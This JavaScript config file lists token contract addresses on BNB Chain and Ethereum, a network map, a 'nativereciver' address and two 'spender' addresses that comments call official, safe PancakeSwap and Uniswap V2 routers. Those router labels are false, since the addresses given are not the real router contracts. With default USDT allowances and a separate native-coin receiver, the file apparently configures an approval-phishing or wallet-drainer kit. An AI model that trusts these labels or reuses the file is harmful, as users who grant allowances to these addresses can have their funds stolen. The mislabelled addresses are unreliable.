export const tokenUsdtAddBNB = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BEP20)
export const tokenUsdcAddBNB = "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"; // USDC (BEP20)
export const linkAddBNB = "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD"; // LINK
export const wbtcAddBNB = "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c"; // WBTC
export const pendleAddBNB = "0xb3Ed0A426155B79B898849803E3B36552f7ED507"; // Pendle

// Ethereum Mainnet
export const tokenUsdtAddETH = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT (ERC20)
export const tokenUsdcAddETH = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"; // USDC (ERC20)
export const wethAddETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"; // WETH
export const linkAddETH = "0x514910771AF9Ca656af840dff83E8264EcF986CA"; // LINK
export const wbtcAddETH = "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"; // WBTC
export const pendleAddETH = "0x808507121B80c02388fAd14726482e061B8da827"; // Pendle

// ------------------ Spenders (Routers) ------------------
// Official Routers (safe choices for allowance)
export const contractAddBNB = "0x0d3d9deB9C666C5982b73B183c199F00201454d9"; // PancakeSwap V2 Router
export const contractAddETH = "0x3f9175bC2Bcf57cA2Ac0418f166A6Fb8526D278B"; // Uniswap V2 Router

// ------------------ Other ------------------
export const nativereciver = "0x281f8AC37696c493c2178a28d5Db2D1678FC333E";
export const chainIdETH = 1;
export const chainIdBNB = 56;

// ------------------ Network Config ------------------
export const NETWORKS = {
	1: {
		name: "Ethereum",
		symbol: "ETH",
		spender: contractAddETH, // Uniswap Router
		tokenAddress: tokenUsdtAddETH, // Default token = USDT
		decimals: 6, // USDT on ETH has 6 decimals
	},
	56: {
		name: "BSC",
		symbol: "BNB",
		spender: contractAddBNB, // PancakeSwap Router
		tokenAddress: tokenUsdtAddBNB, // Default token = USDT
		decimals: 18, // USDT on BSC has 18 decimals
	},
};
